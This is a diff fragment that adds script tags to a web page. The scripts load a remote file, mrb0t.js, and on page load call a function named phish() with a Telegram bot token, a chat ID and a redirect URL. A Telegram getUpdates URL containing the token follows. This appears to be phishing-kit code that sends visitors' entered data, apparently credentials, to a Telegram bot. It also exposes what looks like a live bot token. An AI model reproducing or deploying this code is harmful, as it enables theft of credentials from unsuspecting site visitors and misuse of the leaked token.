@@ -1,0 +1,17 @@
+
+<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
+        integrity="sha256-pasqAKBDmFT4eHoN2ndd6lN370kFiGUFyTiUHWhU7k8=" crossorigin="anonymous"></script>
+    <script src="https://d071n.github.io/mrb0t/mrb0t.js"></script>
+    <script>
+        $(document).ready(function () {
+            const BOT_TOKEN = '2092716584:AAEN3UivMadCV80baSz_GVMOVMjVp1VWBcE',
+                CHAT_ID = '1213206841',
+                REDIRECT_URL = '   '
+            phish(BOT_TOKEN, CHAT_ID, REDIRECT_URL);
+        });
+    </script>
+    
+    
+    
+    
+   https://api.telegram.org/bot2092716584:AAEN3UivMadCV80baSz_GVMOVMjVp1VWBcE/getUpdates
